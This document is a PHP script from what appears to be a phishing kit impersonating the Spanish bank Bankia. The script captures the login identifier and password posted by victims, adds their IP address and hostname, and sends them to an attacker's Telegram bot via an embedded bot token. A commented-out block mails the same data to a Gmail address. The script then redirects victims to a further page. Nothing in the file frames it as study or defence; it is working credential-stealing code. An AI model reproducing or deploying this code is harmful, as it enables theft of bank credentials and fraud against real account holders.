  ﻿<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "==============|| BANKIA LOG  ||===========\n";
$message .= "USERNAME		: ".$_POST['identificador']."\n";
$message .= "PASSWORD   	: ".$_POST['password']."\n";
$message .= "============================================\n";
$message .= "IP Address 		: ".$ip."\n";
$message .= "Host Name 		: ".$hostname."\n";
$message .= "==============||  By Casaoui ||==============\n";

//$send = "fouadset1224@gmail.com";
//$subject = "Endesa[CC] | ".$ip."\n";
//$headers = "From: pc.endesa<D7497383@onlinehome.de>";
//mail($send,$subject,$message,$headers);
$website="https://api.telegram.org/bot1246911202:AAHDB4ArG8t1fiezGi4FAw2a57FUZOa1UO0";
$chatId=-256668232;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-256668232',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo '<meta http-equiv="refresh" content="0; URL=tele.php">';

?>
  